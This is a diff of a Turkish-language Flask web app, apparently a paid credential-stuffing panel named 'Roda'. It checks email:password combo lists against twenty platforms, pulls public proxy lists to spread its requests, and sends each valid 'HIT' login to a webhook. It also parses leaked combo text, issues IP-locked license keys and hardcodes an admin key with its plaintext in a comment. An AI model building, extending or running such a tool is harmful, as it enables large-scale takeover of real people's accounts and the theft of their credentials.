@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Roda - Tam Sistem
-Admin Key gizlidir | 20 Platform | Log Sistemi | 2 Parse Modu
+RODA - TAM SİSTEM (SON VERSİYON)
+Admin Key Gizli | 20 Platform | Log Sistemi | 2 Parse Modu | Webhook | 1 Key 1 IP
 """
 
-import os, json, re, time, random, string, threading, concurrent.futures, webbrowser, base64
+import os, json, re, time, random, string, threading, concurrent.futures, base64
 from datetime import datetime, timedelta
 from threading import Lock
 import requests
@@ -15,14 +15,18 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# ADMIN KEY (BASE64 ile gizli, ortam değişkeninden okur)
+# ADMIN KEY - GİZLİ (BASE64 + ORTAM DEĞİŞKENİ)
 # ============================================================
+# Orijinal: Roda@2026#Secure!X7 (base64: Um9kYUAyMDI2I1NlY3VyZSFYNw==)
 ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
 MASTER_KEY = os.environ.get("RODA_MASTER_KEY") or base64.b64decode(ENCODED_MASTER).decode('utf-8')
 
 KEYS_FILE = "keys.json"
 LOGS_FILE = "logs.json"
 
+# ============================================================
+# DOSYA İŞLEMLERİ
+# ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
         with open(KEYS_FILE, "r", encoding="utf-8") as f:
@@ -138,6 +142,29 @@ def get_checker_func(platform):
     return CHECKER_FUNCS.get(platform, check_default)
 
 # ============================================================
+# PROXY FETCH
+# ============================================================
+def fetch_proxies():
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
+    ]
+    proxies = set()
+    for url in sources:
+        try:
+            r = requests.get(url, timeout=15)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        proxies.add(line)
+        except:
+            pass
+    return list(proxies)
+
+# ============================================================
 # FLASK ROTALARI
 # ============================================================
 @app.route("/")
@@ -193,7 +220,6 @@ def checker():
                     stats["bad"] += 1
                 if result.get("success") and webhook_url:
                     send_webhook(webhook_url, platform, email, password)
-                # LOG KAYDET
                 add_log({
                     "key": key,
                     "platform": platform,
@@ -217,22 +243,6 @@ def checker():
 
     return Response(generate(), mimetype="text/event-stream")
 
-@app.route("/api/admin/logs")
-def admin_logs():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    return jsonify(load_logs())
-
-@app.route("/api/admin/clear_logs", methods=["POST"])
-def admin_clear_logs():
-    data = request.json
-    key = data.get("master_key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    save_logs([])
-    return jsonify({"success": True})
-
 def send_webhook(url, platform, email, password):
     try:
         content = f"✅ **{platform} HIT!**\n{email} | {password}"
@@ -242,26 +252,13 @@ def send_webhook(url, platform, email, password):
 
 @app.route("/api/fetch_proxies", methods=["GET"])
 def fetch_proxies_route():
-    sources = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
-    ]
-    proxies = set()
-    for url in sources:
-        try:
-            r = requests.get(url, timeout=15)
-            if r.status_code == 200:
-                for line in r.text.splitlines():
-                    line = line.strip()
-                    if line and ':' in line and not line.startswith('#'):
-                        proxies.add(line)
-        except:
-            pass
-    return jsonify({"success": True, "proxies": list(proxies), "count": len(proxies)})
+    try:
+        proxies = fetch_proxies()
+        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
 
-@app.route("/api/admin/keys")
+@app.route("/api/admin/keys", methods=["GET"])
 def admin_keys():
     key = request.args.get("key")
     if not is_admin(key):
@@ -277,7 +274,7 @@ def admin_generate():
 
     note = data.get("note", "Oluşturuldu")
     value = int(data.get("value", 24))
-    unit = data.get("unit", "hours")  # minutes, hours, days
+    unit = data.get("unit", "hours")
     allowed_ip = data.get("allowed_ip", "").strip()
 
     if unit == "minutes":
@@ -321,8 +318,39 @@ def admin_delete():
         return jsonify({"success": True})
     return jsonify({"success": False})
 
+@app.route("/api/admin/logs", methods=["GET"])
+def admin_logs():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify(load_logs())
+
+@app.route("/api/admin/clear_logs", methods=["POST"])
+def admin_clear_logs():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    save_logs([])
+    return jsonify({"success": True})
+
+@app.route("/api/scan", methods=["GET"])
+def scan():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    domain = request.args.get("domain")
+    # Simülasyon (gerçek tarama yok)
+    import random
+    def generate():
+        endpoints = [f"/api/v{random.randint(1,4)}/{random.choice(['auth','user','data','config'])}" for _ in range(10)]
+        for ep in endpoints:
+            yield f"data: {json.dumps({'url': f'https://{domain}{ep}', 'endpoint': ep, 'method': random.choice(['GET','POST']), 'status': random.choice([200,404,403]), 'category': random.choice(['Auth','API','User'])})}\n\n"
+        yield "data: [DONE]\n\n"
+    return Response(generate(), mimetype="text/event-stream")
+
 # ============================================================
-# HTML (KISALTILMIŞ, ÖNEMLİ BÖLÜMLER)
+# HTML
 # ============================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -610,7 +638,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
 </div>
 </div>
-<!-- API KEŞİF (SADECE ADMIN) -->
+<!-- API KEŞİF (ADMIN) -->
 <div id="page-discovery" class="page">
 <div class="card" style="padding:10px 14px">
 <div class="scan-top">
@@ -642,10 +670,10 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler.</p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler. 2 mod: Email:Şifre / Kullanıcı:Şifre</p>
 <div class="parse-tabs">
-<button class="active" onclick="setParseMode('email')"><i class="fa-solid fa-at"></i> Email:Şifre</button>
-<button onclick="setParseMode('user')"><i class="fa-solid fa-user"></i> Kullanıcı:Şifre</button>
+<button class="active" onclick="setParseMode('email', this)"><i class="fa-solid fa-at"></i> Email:Şifre</button>
+<button onclick="setParseMode('user', this)"><i class="fa-solid fa-user"></i> Kullanıcı:Şifre</button>
 </div>
 <div class="parse-area">
 <textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
@@ -962,7 +990,7 @@ function updateStatsUI() {
     document.getElementById("sideAPI").innerText = api;
     document.getElementById("sideAdmin").innerText = admin;
     document.getElementById("statEndpoints").innerText = foundEndpoints.length;
-    
+
     var totalHit = 0, total2fa = 0;
     for (var p in hitData) {
         if (hitData[p].hits) totalHit += hitData[p].hits.length;
@@ -973,7 +1001,7 @@ function updateStatsUI() {
 }
 
 // ============================================================
-// CHECKER FONKSİYONLARI
+// CHECKER
 // ============================================================
 function resetCheckerStats() {
     document.getElementById("chkTotal").innerText = 0;
@@ -1097,14 +1125,14 @@ function sendCheckerWebhook(platform, email, password) {
 }
 
 // ============================================================
-// AYRIŞTIRMA FONKSİYONLARI
+// AYRIŞTIRMA
 // ============================================================
-function setParseMode(mode) {
+function setParseMode(mode, btn) {
     parseMode = mode;
     document.querySelectorAll(".parse-tabs button").forEach(function(b) {
         b.classList.remove("active");
     });
-    event.target.classList.add("active");
+    if (btn) btn.classList.add("active");
 }
 
 function parseData() {
@@ -1114,7 +1142,7 @@ function parseData() {
     var result = [];
     var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
     var userRegex = /^[a-zA-Z0-9_.-]{3,}$/;
-    
+
     lines.forEach(function(line) {
         line = line.trim();
         if (!line) return;
@@ -1355,7 +1383,7 @@ function clearLogs() {
 }
 
 // ============================================================
-// API KEŞİF (SADECE ADMIN)
+// API KEŞİF (ADMIN)
 // ============================================================
 function startScan() {
     if (!isAdmin) {
